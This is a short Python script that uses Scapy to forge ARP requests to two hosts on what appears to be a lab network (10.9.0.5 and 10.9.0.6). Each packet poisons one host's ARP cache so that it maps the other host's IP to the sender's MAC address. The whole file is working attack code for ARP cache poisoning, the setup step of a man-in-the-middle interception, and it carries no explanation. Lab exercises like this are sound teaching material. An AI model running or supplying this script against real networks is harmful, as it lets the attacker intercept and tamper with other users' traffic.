#!/usr/bin/python3
from scapy.all import *

# ARP CACHE POISONING HOST A 

E1 = Ether(src='02:42:0a:09:00:69', dst='02:42:0a:09:00:05')

A1 = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6', 
	hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')

A1.op = 1 # 1 for ARP request; 2 for ARP reply

# ARP CACHE POISONING HOST B

E2 = Ether(src='02:42:0a:09:00:69', dst='02:42:0a:09:00:06')

A2 = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.5', 
	hwdst='02:42:0a:09:00:06', pdst='10.9.0.6')

A2.op = 1 # 1 for ARP request; 2 for ARP reply

pkt1 = E1/A1
pkt1.show()

pkt2 = E2/A2
pkt2.show()

sendp(pkt1)
sendp(pkt2)

